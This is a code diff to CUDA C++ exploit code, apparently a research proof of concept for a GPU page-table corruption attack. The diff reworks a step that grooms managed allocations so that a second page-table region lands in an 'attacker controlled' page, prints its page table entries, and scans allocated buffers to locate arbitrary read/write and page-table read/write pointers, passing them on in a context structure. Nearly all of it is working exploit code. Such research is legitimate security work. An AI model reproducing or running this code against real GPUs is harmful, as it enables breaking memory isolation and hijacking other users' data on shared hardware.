@@ -13,10 +13,9 @@ struct CudaSharedMemHandles {
 
 bool
 second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
-                  double threshold, uint64_t skip)
+                  double threshold, uint64_t skip, GPUBreachContext &ctx)
 {
   uint8_t *temp;
-  GPUBreachContext ctx;
   if (!first_PT_region_attack (num_alloc_init, num_alloc_post_msg, threshold,
                                skip, ctx))
     {
@@ -30,6 +29,7 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
   auto& victim_ptr = ctx.step3_data.victim_ptr;
   auto& corrupted_id = ctx.step3_data.corrupted_id;
   auto& victim_id = ctx.step3_data.victim_id;
+  ctx.step4_data.corrupted_ptr = corrupted_ptr;
 
   std::cout << corrupted_id << " " << victim_id << '\n';
   std::cout << "Ready to Start Second PTC Test " << '\n';
@@ -37,6 +37,7 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
 
   uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
   uint64_t next_id = ERR_next_id;
+  std::vector<uint8_t *> misc_ptrs;
   for (uint64_t i = 0; i < num_alloc_init; i += 1)
     {
       // Create free space for Page Table Region
@@ -46,8 +47,9 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
-      // DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;
-      std::cout << i << " New PT time: " << currentMS << " ms" << std::endl;
+      DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;
+
+      misc_ptrs.push_back(temp);
 
       if (i < skip || i % 511 == 0)
         continue;
@@ -58,18 +60,11 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
         next_id = i + 508;
     }
 
-  std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
-               "Region: Press \033[1;32mEnter Key\033[0m to continue..."
-            << '\n';
   for (auto ptr : agg_ptrs)
     cudaFree(ptr);
-  pause ();
-
-  std::cout << "ok"
-            << '\n';
 
   std::vector<uint8_t*> fourkb_pages;
-  for (uint64_t i = 0; i < 225; i += 1)
+  for (uint64_t i = 0; i < (((uint64_t)corrupted_ptr % (2L * 1024 * 1024)) / 4096) + 1; i += 1)
     {
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
@@ -79,19 +74,37 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
     }
   for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
   {
-    if (i != corrupted_id && i != victim_id)
+    if (i != corrupted_id)
       cudaFree(region_ptrs[i]);
     gpuErrchk(cudaPeekAtLastError());
   }
-  std::vector<void*> cm_ptrs(8000);
-  for (uint64_t i = 0; i < 8000; i += 1)
+  for (uint64_t i = 0; i < misc_ptrs.size(); i += 1)
+  {
+    cudaFree(misc_ptrs[i]);
+    gpuErrchk(cudaPeekAtLastError());
+  }
+
+  std::vector<void*> &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
+  cudaMalloced_ptrs.reserve(500);
+  for (uint64_t i = 0; i < 500; i += 1)
     {
-      cudaMalloc(&cm_ptrs[i], ALLOC_SIZE);
-      // time_data_access ((uint8_t*)cm_ptrs[i], ALLOC_SIZE);
-      memset_ptr<<<1,1>>>((uint8_t*)cm_ptrs[i], (uint64_t)cm_ptrs[i], 8);
+      cudaMalloc(&cudaMalloced_ptrs[i], ALLOC_SIZE);
+      memset_ptr<<<1,1>>>((uint8_t*)cudaMalloced_ptrs[i], (uint64_t)cudaMalloced_ptrs[i], 8);
     }
+  for (auto& ptr : fourkb_pages)
+    cudaFree(ptr);
+
   print_memory<<<1,1>>>(corrupted_ptr, 64 * 1024);
   cudaDeviceSynchronize();
+
+  std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
+               "Region. We printed out the PTEs of the controlled page and provided "
+               "relevant pointers to interact with them in struct S4_ExploitComplete.\n"
+               "Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' "
+               "means they are the 4KB PTEs.\n"
+               "Press \033[1;32mEnter Key\033[0m to continue..."
+            << '\n';
+  pause();
 
   std::cout << (void*)(temp + ALLOC_SIZE) << '\n';
   pause();
@@ -135,13 +148,13 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
   cudaDeviceSynchronize();
   gpuErrchk(cudaPeekAtLastError());
   
-  for (int j = 0; j < cm_ptrs.size(); j++)
+  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
   {
-    cudaMemcpyArray(data_device_ptr, (uint8_t*)cm_ptrs[j], 8);
-    if (*(void**)data_device_ptr !=  (void *)cm_ptrs[j])
+    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
+    if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
     {
-      std::cout << "Arb:" << (void *)cm_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
-      arb_rw_ptr = (void *)cm_ptrs[j];
+      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
+      arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
       arb_rw_ofs = j;
       break;
     }
@@ -187,13 +200,13 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
 
-  for (int j = 0; j < cm_ptrs.size(); j++)
+  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
   {
-    cudaMemcpyArray(data_device_ptr, (uint8_t*)cm_ptrs[j], 8);
-    if ((void *)cm_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cm_ptrs[j])
+    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
+    if ((void *)cudaMalloced_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
     {
-      std::cout << "PT rw:" << (void *)cm_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
-      pt_rw_ptr = (void *)cm_ptrs[j];
+      std::cout << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
+      pt_rw_ptr = (void *)cudaMalloced_ptrs[j];
       pt_rw_ofs = j;
       break;
     }
@@ -294,6 +307,7 @@ second_PT_region (int argc, char *argv[])
   const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
   const double threshold = std::stod (argv[2]);
   const uint64_t skip = std::stoull (argv[3]);
+  GPUBreachContext ctx;
 
-  return second_PT_region (num_alloc_init, num_alloc_post_msg, threshold, skip);
+  return second_PT_region (num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
 }
